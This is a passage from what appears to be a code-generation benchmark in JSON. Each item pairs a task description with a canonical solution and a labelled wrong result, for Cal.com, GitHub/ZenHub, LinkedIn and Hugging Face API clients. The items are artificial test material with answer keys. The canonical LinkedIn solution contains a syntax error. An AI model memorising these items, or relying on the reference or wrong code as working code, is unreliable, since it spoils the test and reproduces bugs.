params=querystring)\n            if response.status_code == 200:\n                bookings = response.json()[\"data\"]\n                if not bookings:\n                    return \"No upcoming bookings found.\"\n\n                booking_info = []\n                for booking in bookings:\n                    user_time = self._convert_to_user_timezone(booking[\"start\"])\n                    booking_info.append(\n                        f\"uid: {booking['uid']}, Title: {booking['title']}, Time: {user_time}, Status: {booking['status']}\"\n                    )\n                return \"Upcoming bookings:\\n\" + \"\\n\".join(booking_info)\n            return f\"Failed to fetch bookings: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def reschedule_booking(self, booking_uid: str, new_start_time: str, reason: str) -> str:\n        try:\n            url = f\"https://api.cal.com/v2/bookings/{booking_uid}/reschedule\"\n            new_start_time = datetime.fromisoformat(new_start_time).astimezone(pytz.utc).isoformat(timespec=\"seconds\")\n            payload = {\"start\": new_start_time, \"reschedulingReason\": reason}\n\n            response = requests.post(url, json=payload, headers=self._get_headers())\n            if response.status_code == 201:\n                booking_data = response.json()[\"data\"]\n                user_time = self._convert_to_user_timezone(booking_data[\"start\"])\n                return f\"Booking rescheduled to {user_time}. New booking uid: {booking_data['uid']}\"\n            return f\"Failed to reschedule booking: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def cancel_booking(self, booking_uid: str, reason: str) -> str:\n        try:\n            url = f\"https://api.cal.com/v2/bookings/{booking_uid}/cancel\"\n            payload = {\"cancellationReason\": reason}\n\n            response = requests.post(url, json=payload, headers=self._get_headers())\n            if response.status_code == 200:\n                return \"Booking cancelled successfully.\"\n            return f\"Failed to cancel booking: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nimport datetime\nimport pytz\nfrom typing import Dict, str\n\nclass CalComAPI:\n    def __init__(self, api_key: str, event_type_id: int, user_timezone: str = \"America/New_York\"):\n        self.api_key = api_key\n        self.event_type_id = event_type_id\n        self.user_timezone = user_timezone\n\n    def _convert_to_user_timezone(self, utc_time: str) -> str:\n        # Parse UTC time string into a datetime object\n        utc_time_obj = datetime.datetime.strptime(utc_time, \"%Y-%m-%d %H:%M:%S\")\n        utc_time_obj = utc_time_obj.replace(tzinfo=datetime.timezone.utc)\n        \n        # Convert to user's timezone\n        user_tz = pytz.timezone(self.user_timezone)\n        user_time_obj = utc_time_obj.astimezone(user_tz)\n        \n        # Format as string in user's timezone\n        return user_time_obj.strftime(\"%Y-%m-%d %H:%M:%S\")\n\n    def _get_headers(self, api_version: str = \"2024-08-13\") -> Dict[str, str]:\n        return {\n            \"Authorization\": f\"Bearer {self.api_key}\",\n            \"Calcom-Api-Version\": api_version\n        }\n\n    def get_available_slots(self, start_date: str, end_date: str) -> str:\n        # Construct API request\n        url = f\"https://api.cal.com/v2/event-types/{self.event_type_id}/slots\"\n        params = {\n            \"start_date\": start_date,\n            \"end_date\": end_date\n        }\n        headers = self._get_headers()\n        response = requests.get(url, headers=headers, params=params)\n        return response.json()\n\n    def create_booking(self, start_time: str, name: str, email: str) -> str:\n        # Construct API request\n        url = f\"https://api.cal.com/v2/bookings\"\n        payload = {\n            \"event_type_id\": self.event_type_id,\n            \"start_time\": start_time,\n            \"name\": name,\n            \"email\": email\n        }\n        headers = self._get_headers()\n        response = requests.post(url, headers=headers, json=payload)\n        return response.json()\n\n    def get_upcoming_bookings(self, email: str) -> str:\n        # Construct API request\n        url = f\"https://api.cal.com/v2/bookings\"\n        params = {\n            \"email\": email\n        }\n        headers = self._get_headers()\n        response = requests.get(url, headers=headers, params=params)\n        return response.json()\n\n    def reschedule_booking(self, booking_uid: str, new_start_time: str, reason: str) -> str:\n        # Construct API request\n        url = f\"https://api.cal.com/v2/bookings/{booking_uid}\"\n        payload = {\n            \"start_time\": new_start_time,\n            \"reason\": reason\n        }\n        headers = self._get_headers()\n        response = requests.put(url, headers=headers, json=payload)\n        return response.json()\n\n    def cancel_booking(self, booking_uid: str, reason: str) -> str:\n        # Construct API request\n        url = f\"https://api.cal.com/v2/bookings/{booking_uid}\"\n        payload = {\n            \"reason\": reason\n        }\n        headers = self._get_headers()\n        response = requests.delete(url, headers=headers, json=payload)\n        return response.json()"
  },
  {
    "Task_id": 92,
    "Instruction": "Task Description: Create a Python function to interact with GitHub and ZenHub APIs to retrieve repository, board, and issue information.\n\nFunction Description: The function will make HTTP requests to GitHub and ZenHub APIs to fetch specific data about repositories, boards, and issues. It handles authentication, sends requests, checks responses, and returns the parsed data.\n\nInput:\n- github_token: [str] - GitHub personal access token for authentication\n- github_org: [str] - GitHub organization name\n- github_repo: [str] - GitHub repository name\n- zenhub_token: [str] - ZenHub API token for authentication\n- issue_number: [int] - GitHub issue number to query (for issue-related functions)\n\nOutput:\n- For get_github_repo_id: [int] - Returns the GitHub repository ID\n- For get_zenhub_board: [dict] - Returns the ZenHub board data as a dictionary\n- For get_github_issue: [dict] - Returns GitHub issue data as a dictionary\n- For get_zenhub_issue_info: [dict] - Returns ZenHub issue information as a dictionary\n\nMethods:\n1. get_github_repo_id(github_token, github_org, github_repo) -> int - Retrieves the repository ID from GitHub API\n2. get_zenhub_board(zenhub_token, github_repo_id) -> dict - Fetches ZenHub board data for a given repository ID\n3. get_github_issue(github_token, github_org, github_repo, issue_number) -> dict - Gets GitHub issue details\n4. get_zenhub_issue_info(zenhub_token, github_repo_id, issue_number) -> dict - Retrieves ZenHub-specific issue information",
    "Canonical_solution": "import requests\nimport os\n\nGITHUB_API_URL = \"https://api.github.com\"\nGITHUB_GRAPHQL_URL = \"https://api.github.com/graphql\"\nZENHUB_API_URL = \"https://api.zenhub.com/p1/repositories/{repo_id}/board\"\n\ndef get_github_repo_id(github_token, github_org, github_repo):\n    url = f\"{GITHUB_API_URL}/repos/{github_org}/{github_repo}\"\n    headers = {\n        \"Authorization\": github_token\n    }\n\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json().get(\"id\")\n    else:\n        response.raise_for_status()\n\ndef get_zenhub_board(zenhub_token, github_repo_id):\n    url = ZENHUB_API_URL.format(repo_id=github_repo_id)\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"X-Authentication-Token\": zenhub_token\n    }\n\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        response.raise_for_status()\n\ndef get_github_issue(github_token, github_org, github_repo, issue_number):\n    url = f\"https://api.github.com/repos/{github_org}/{github_repo}/issues/{issue_number}\"\n    headers = {\n        \"Authorization\": f\"token {github_token}\",\n        \"Accept\": \"application/vnd.github.v3+json\"\n    }\n\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()\n    else:\n        response.raise_for_status()\n\ndef get_zenhub_issue_info(zenhub_token, github_repo_id, issue_number):\n    url = f\"https://api.zenhub.com/p1/repositories/{github_repo_id}/issues/{issue_number}\"\n    headers = {\n        \"X-Authentication-Token\": zenhub_token,\n        \"Accept\": \"application/json\"\n    }\n\n    response = requests.get(url, headers=headers)\n    if response.status_code == 200:\n        return response.json()\n    elif response.status_code == 403:\n        print(\"Rate limit exceeded. Sleeping for 1 minute\")\n    else:\n        response.raise_for_status()",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\n\ndef get_github_repo_id(github_token, github_org, github_repo):\n    url = f\"https://api.github.com/orgs/{github_org}/repos/{github_repo}\"\n    headers = {\"Authorization\": f\"token {github_token}\"}\n    response = requests.get(url, headers=headers)\n    response.raise_for_status()\n    return response.json()['id']\n\ndef get_zenhub_board(zenhub_token, github_repo_id):\n    url = f\"https://api.zenhub.com/projects/{github_repo_id}\"\n    headers = {\"Authorization\": f\"token {zenhub_token}\"}\n    response = requests.get(url, headers=headers)\n    response.raise_for_status()\n    return response.json()\n\ndef get_github_issue(github_token, github_org, github_repo, issue_number):\n    url = f\"https://api.github.com/repos/{github_org}/{github_repo}/issues/{issue_number}\"\n    headers = {\"Authorization\": f\"token {github_token}\"}\n    response = requests.get(url, headers=headers)\n    response.raise_for_status()\n    return response.json()\n\ndef get_zenhub_issue_info(zenhub_token, github_repo_id, issue_number):\n    url = f\"https://api.zenhub.com/projects/{github_repo_id}/issues/{issue_number}\"\n    headers = {\"Authorization\": f\"token {zenhub_token}\"}\n    response = requests.get(url, headers=headers)\n    response.raise_for_status()\n    return response.json()"
  },
  {
    "Task_id": 95,
    "Instruction": "Task Description: Implement a LinkedIn API toolkit class that provides functionality to interact with LinkedIn's API for creating posts, deleting posts, and retrieving user profile information.\n\nClass Description: The LinkedInToolkit class encapsulates LinkedIn API operations including post creation, post deletion, and profile retrieval. It handles authentication using an access token and manages API requests and responses.\n\nAttributes:\n_access_token: str - Stores the LinkedIn API access token retrieved from environment variables.\n\nMethods:\n__init__() -> None - Initializes the LinkedInToolkit instance by obtaining the access token.\ncreate_post(text: str) -> Dict - Creates a new LinkedIn post with the given text content.\ndelete_post(post_id: str) -> str - Deletes a LinkedIn post specified by its post ID.\nget_profile(include_id: bool = False) -> Dict - Retrieves the user's LinkedIn profile information.\n_get_access_token() -> str - Private method to retrieve the LinkedIn access token from environment variables.",
    "Canonical_solution": "import json\nimport os\nfrom http import HTTPStatus\nfrom typing import List, Dict\nimport requests\n\nclass LinkedInToolkit:\n    def __init__(self):\n        self._access_token = self._get_access_token()\n\n    def create_post(self, text: str) -> Dict:\n        url = 'https://api.linkedin.com/v2/ugcPosts'\n        urn = self.get_profile(include_id=True)\n\n        headers = {\n            'X-Restli-Protocol-Version': '2.0.0',\n            'Content-Type': 'application/json',\n            'Authorization': f'Bearer {self._access_token}',\n        }\n\n        post_data = {\n            \"author\": urn['id'],\n            \"lifecycleState\": \"PUBLISHED\",\n            \"specificContent\": {\n                \"com.linkedin.ugc.ShareContent\": {\n                    \"shareCommentary\": {\"text\": text},\n                    \"shareMediaCategory\": \"NONE\",\n                }\n            },\n            \"visibility\": {\n                \"com.linkedin.ugc.MemberNetworkVisibility\": \"PUBLIC\"\n            },\n        }\n\n        response = requests.post(\n            url, headers=headers, data=json.dumps(post_data)\n        if response.status_code == 201:\n            post_response = response.json()\n            post_id = post_response.get('id', None)\n            return {'Post ID': post_id, 'Text': text}\n        else:\n            raise Exception(\n                f\"Failed to create post. Status code: {response.status_code}, \"\n                f\"Response: {response.text}\"\n            )\n\n    def delete_post(self, post_id: str) -> str:\n        headers = {\n            \"Authorization\": f'Bearer {self._access_token}',\n            \"Content-Type\": \"application/json\",\n        }\n\n        response = requests.delete(\n            f\"https://api.linkedin.com/v2/ugcPosts/{post_id}\",\n            headers=headers,\n        )\n\n        if response.status_code != HTTPStatus.NO_CONTENT:\n            return (\n                f\"Request returned error: \"\n                f\"{response.status_code} {response.text}\"\n            )\n\n        return f\"Post deleted successfully. Post ID: {post_id}.\"\n\n    def get_profile(self, include_id: bool = False) -> Dict:\n        headers = {\n            \"Authorization\": f'Bearer {self._access_token}',\n            'Connection': 'Keep-Alive',\n            'Content-Type': 'application/json',\n            \"X-Restli-Protocol-Version\": \"2.0.0\",\n        }\n\n        response = requests.get(\n            \"https://api.linkedin.com/v2/userinfo\",\n            headers=headers,\n        )\n\n        if response.status_code != HTTPStatus.OK:\n            raise Exception(\n                f\"Failed to retrieve profile. \"\n                f\"Status code: {response.status_code}, \"\n                f\"Response: {response.text}\"\n            )\n\n        json_response = response.json()\n\n        locale = json_response.get('locale', {})\n        country = locale.get('country', 'N/A')\n        language = locale.get('language', 'N/A')\n\n        profile_report = {\n            \"Country\": country,\n            \"Language\": language,\n            \"First Name\": json_response.get('given_name'),\n            \"Last Name\": json_response.get('family_name'),\n            \"Email\": json_response.get('email'),\n        }\n\n        if include_id:\n            profile_report['id'] = f\"urn:li:person:{json_response['sub']}\"\n\n        return profile_report\n\n    def _get_access_token(self) -> str:\n        token = os.getenv(\"LINKEDIN_ACCESS_TOKEN\")\n        if not token:\n            return \"Access token not found. Please set LINKEDIN_ACCESS_TOKEN.\"\n        return token",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import os\nimport requests\n\nclass LinkedInToolkit:\n    def __init__(self):\n        self._access_token = self._get_access_token()\n    \n    def _get_access_token(self) -> str:\n        return os.environ.get('LINKEDIN_ACCESS_TOKEN')\n    \n    def create_post(self, text: str) -> dict:\n        url = 'https://api.linkedin.com/v2/post'\n        headers = {\n            'Authorization': f'Bearer {self._access_token}',\n            'Content-Type': 'application/json'\n        }\n        data = {'text': text}\n        response = requests.post(url, headers=headers, json=data)\n        return response.json()\n    \n    def delete_post(self, post_id: str) -> str:\n        url = f'https://api.linkedin.com/v2/post/{post_id}'\n        headers = {\n            'Authorization': f'Bearer {self._access_token}',\n            'Content-Type': 'application/json'\n        }\n        response = requests.delete(url, headers=headers)\n        return response.text\n    \n    def get_profile(self, include_id: bool = False) -> dict:\n        url = 'https://api.linkedin.com/v2/me'\n        params = {}\n        if include_id:\n            params['includeId'] = 'true'\n        headers = {\n            'Authorization': f'Bearer {self._access_token}',\n            'Content-Type': 'application/json'\n        }\n        response = requests.get(url, headers=headers, params=params)\n        return response.json()"
  },
  {
    "Task_id": 96,
    "Instruction": "Task Description: Scrape SHA256 hashes from Hugging Face dataset pages and save them to a file.\n\nFunction Description: This function scrapes SHA256 hashes from a series of Hugging Face dataset pages by making HTTP GET requests to each page, parsing the HTML content to extract the hashes, and writing them to an output file along with their corresponding filenames. It also prints the collected hashes to the console.\n\nInput: None (The function uses hardcoded URLs and output filename)\n\nOutput: \n1. Writes to \"shard_hashes.txt\" file with format: \"[filename] [SHA256 hash]\"\n2. Prints collected SHA256 hashes to console with format: \"SHA256 hash [index]: [hash]\"\n3. Prints error messages for failed requests or missing hashes",
    "Canonical_solution": "import requests\nimport re\n\ndef scrape_huggingface_hashes():\n    base_url = 'https://huggingface.co/datasets/EleutherAI/pythia_deduped_pile_idxmaps/blob/main/pile_0.87_deduped_text_document-'\n    sha256_list = []\n\n    with open(\"shard_hashes.txt\", \"w\") as output_file:\n        for i in range(83):\n            page_number = f\"{i:05d}-of-00082.bin\"\n            url = base_url + page_number\n            file_name = url.split('/')[-1]\n\n            response = requests.get(url)\n\n            if response.status_code == 200:\n                html_content = response.text\n                matches = re.findall(r'<strong>SHA256:</strong>\\s*([\\da-fA-F]+)', html_content)\n\n                if matches:\n                    sha256_list.extend(matches)\n                    for sha256 in matches:\n                        output_file.write(f\"{file_name} {sha256}\\n\")\n                else:\n                    print(f\"No hash found for file: {file_name}\")\n            else:\n                print(f\"Failed to fetch HTML content from {url}. Status code: {response.status_code}\")\n\n    for idx, sha256 in enumerate(sha256_list, start=1):\n        print(f\"SHA256 hash {idx}: {sha256}\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nfrom bs4 import BeautifulSoup\nimport os\n\ndef scrape_hf_hashes():\n    urls = [\n        \"https://huggingface.co/datasets/example/ModelA\",\n        \"https://huggingface.co/datasets/example/ModelB\"\n    ]\n    output_file = \"shard_hashes.txt\"\n    global_index = 0\n    \n    for url in urls:\n        try:\n            response = requests.get(url)\n            response.raise_for_status()\n            soup = BeautifulSoup(response.text, 'html.parser')\n            hashes = soup.find_all('div', class_='hash')\n            hashes = [h.get_text(strip=True) for h in hashes]\n            if not hashes:\n                print(f\"No hashes found on {url}\")\n                continue\n            for hash_val in hashes:\n                filename = url.split('/')[-1]\n                with open(output_file, 'a') as f:\n                    f.write(f\"{filename} {hash_val}\\n\")\n                print(f\"SHA256 hash [{global_index}]: {hash_val}\")\n                global_index += 1\n        except requests.RequestException as e:\n            print(f\"Error fetching {url}: {e}\")\n        except Exception as e:\n            print(f\"Unexpected error on {url}: {e}\")"
  },
  {
    "Task_id": 98,
    "Instruction": "Task Description: Create a function to fetch all repositories from a GitHub organization using the GitHub API.\n\nFunction Description: The function `fetch_github_repos` asynchronously retrieves all repositories belonging to a specified GitHub organization. It handles pagination to ensure all repositories are fetched, even if they span multiple pages. The function uses the GitHub REST API with proper authentication and headers.\n\nInput:\n- `org_name` (str): The name of the GitHub organization whose repositories are to be fetched.\n- `token` (str): A GitHub personal access token for authentication.\n\nOutput:\n- Returns a list of dictionaries, where each dictionary represents a repository from the organization. Returns an empty list if the request fails or no repositories are found.",
    "Canonical_solution": "import requests\ntoken = \"YOUR_GITHUB_TOKEN\"\n\nasync def fetch_github_repos(org_name, token):\n    url = f\"https://api.github.com/orgs/{org_name}/repos\"\n    headers = {\n        \"Accept\": \"application/vnd.github+json\",\n        \"Authorization\": f\"Bearer {token}\",\n        \"X-GitHub-Api-Version\": \"2022-11-28\",\n    }\n\n    params = {\n        \"per_page\": 100  # You can adjust this number (max is 100)\n    }\n\n    all_repos = []\n\n    while url:\n        response = requests.get(url, headers=headers, params=params)\n\n        if response.status_code == 200:\n            repos = response.json()\n            all_repos.extend(repos)\n\n            # Check if there is a 'next' page\n            if \"next\" in response.links:\n                url = response.links[\"next\"][\"url\"]\n            else:\n                url = None\n        else:\n            print(\n                f\"Failed to fetch repositories: {response.status_code} - {response.text}\"\n            )\n            break\n\n    return all_repos",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import aiohttp\nimport asyncio\n\nasync def fetch_github_repos(org_name, token):\n    repos = []\n    page = 1\n    while True:\n        url = f\"https://api.github.com/orgs/{org_name}/repos?page={page}\"\n        headers = {\n            \"Authorization\": f\"token {token}\",\n            \"Accept\": \"application/vnd.github.v3+json\"\n        }\n        async with aiohttp.ClientSession() as session:\n            async with session.get(url, headers=headers) as response:\n                if response.status != 200:\n                    break\n                data = await response.json()\n                if not data:\n                    break\n                repos.extend(data)\n                page += 1\n    return repos"
  }
]